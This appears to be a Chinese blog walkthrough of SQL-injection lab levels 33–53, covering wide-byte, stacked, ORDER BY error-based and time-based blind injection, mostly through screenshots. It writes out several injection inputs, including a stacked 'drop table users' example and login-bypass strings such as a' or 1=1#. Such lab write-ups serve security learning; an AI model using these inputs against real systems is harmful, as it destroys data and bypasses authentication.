![在这里插入图片描述](https://img-blog.csdnimg.cn/9178621deb834bf1b322a4bb981e8c55.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_16,color_FFFFFF,t_70,g_se,x_16)

查库：

![在这里插入图片描述](https://img-blog.csdnimg.cn/e58f8d44b237419bb6779b9bab84cc29.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

剩下的就简单了

## Test 33

和32的做题方法一模一样，只是源代码中直接使用了 PHP 的addslashes()函数，addslashes(string)函数返回在预定义字符之前添加**反斜杠**\的字符串：可以去了解一下

## Test 34（post型宽字节注入）

和32一样，也是宽字节注入，只不过是post型的而已，所以用%df来解放单引号

![在这里插入图片描述](https://img-blog.csdnimg.cn/0e46d578d0874a639802d1cee1808eba.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

这里发现一个有趣的东西，当我们直接在username这个框里填写注入语句，却并没有回显，这是为什么呢？我查了很多资料，发现原来是因为POST 不能进行 URLencode，而我们之前是利用hackbar来注入，并且是利用里面的urlencode，所以才能成功，如果要在框里填的话，可以可使用 UTF-8 转 UTF-16 或 UTF-32来实现。

![在这里插入图片描述](https://img-blog.csdnimg.cn/00a1d5d03666406d9b0a1f68faa6e1d7.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

剩下的就不过多赘述了

## Test 35

这里发现单引号被转义了，但是根据错误回显发现这个竟然是数字型注入，所以根本不用管，直接注入就完事儿了

![在这里插入图片描述](https://img-blog.csdnimg.cn/4b011fdcb38d4e9eb8f6965784ccda24.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

这里只展示一个查库的：

![在这里插入图片描述](https://img-blog.csdnimg.cn/85f8ca66378a44aa9f9cd27601fa9ed8.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

## Test 36

这里我们发现源码有mysql_real_escape_string()这个函数

自己去了解一下，这里就不来解释了

但是因为 MySQL 我们并没有设置成 GBK，所以这个对我们不起作用

剩下的就和32一样的，不多赘述。

## Test 37

此题和36一样，只是变成了post型的，mysql_real_escape_string()对我们不起作用，所以做法是和34一样的，不多赘述了。

## Test 38（堆叠注入）

这道题和test1一模一样，但是我们采取另外一种方法：堆叠注入

原理：在 SQL 中，分号;用来表示一条 SQL 语句的结束。而我们在;后再加入一条语句，那么在一定条件下也会一起执行

例如，我提交:id=1;drop table users;

而服务器未做检查，生成的 SQL 语句为：

select * from users where id=1;drop table users;

那么users这张表就会被删除

![在这里插入图片描述](https://img-blog.csdnimg.cn/282ed1fa72744de6ac8c82b08584ced1.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

可以发现我们成功创建了wind这张表，但是堆叠注入的局限性非常的大

## Test 39

只是闭合条件变成了数字型注入，其他和38一样

![在这里插入图片描述](https://img-blog.csdnimg.cn/fc5c378ac4524128834f18a2cb9c087a.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

可以看到表flower被成功创建

## Test 40 

闭合条件变成了一个单引号加一个括号')其他一样

## Test 41

闭合条件变成了数字型，其他一样

## Test 42

查看源码，发现我们只能在password处动手脚

![在这里插入图片描述](https://img-blog.csdnimg.cn/155751b6403542e88fb68e02d7bc36c6.png)

用户名随便输,password我填的是a';create table lala like users;#

![在这里插入图片描述](https://img-blog.csdnimg.cn/c50becc0fca84d7d8d9a15167fc65e07.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

可以看到表lala被成功创建

## Test 43

闭合条件变成了’)#，其他和42一样

## Test 44

在密码处构造万能密码，当a' or 1 = 1#时成功，说明为'#闭合

![在这里插入图片描述](https://img-blog.csdnimg.cn/598b64eca7094afea7c6b4f75e51141d.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

其他和之前一样，堆叠注入

## Test 45

同样，在密码处构造万能密码，当输入a') or 1=1#时，登录成功，说明闭合方式为')#其他和之前一样

## Test 46

发现不再要求输入id了，而是要求我们输入sort了

![在这里插入图片描述](https://img-blog.csdnimg.cn/9c496d8904d84521ab9b0d0da4bdb4e6.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

当我们输入sort=1时

![在这里插入图片描述](https://img-blog.csdnimg.cn/d235a528e60b4de09289ae968efb8e32.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

查看源码我们发现：$sql = "SELECT * FROM users ORDER BY $id";

意思是我们只能在order by后面的参数上搞事情，所以sort=1的意思就是以第一列数据也就是ID进行排序，sort=2就是以username进行排序

![在这里插入图片描述](https://img-blog.csdnimg.cn/50a4d74712af49139bb998be8d5dd814.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_14,color_FFFFFF,t_70,g_se,x_16)

根据报错信息显示，我们发现这里是字符型注入

![在这里插入图片描述](https://img-blog.csdnimg.cn/92a42f0e586245b6b4d114904e9618bf.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

然后我们就可以进行报错型注入了

爆库：

![在这里插入图片描述](https://img-blog.csdnimg.cn/99f9b61d54e74d7284e6e87a43b8e5b9.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

剩下的就是基本操作了，就不演示了

## Test 47

闭合方式为单引号，其他同46

## Test 48

本题为数字型注入，因为不管对错都没有回显，所以只能使用时间盲注了

![在这里插入图片描述](https://img-blog.csdnimg.cn/9a1362c5357a4e31aace57623eae6d01.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

说明首字母的ascii值大于100，剩下的就不多赘述了

## Text 49

闭合方式为'--+时间盲注，和48一样

## Test 50

闭合方式为数字型注入

但是通过源码知道此题可以使用堆叠注入

![在这里插入图片描述](https://img-blog.csdnimg.cn/5c19ecdaf6844d4daf7d18ee96ac6d40.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16)

这样就成功创建了111这个表

## Test 51

闭合变成了'--+其他和50一样

## Test 52

和50完全一模一样

## Test 53

闭合变成了'--+其他和50一样

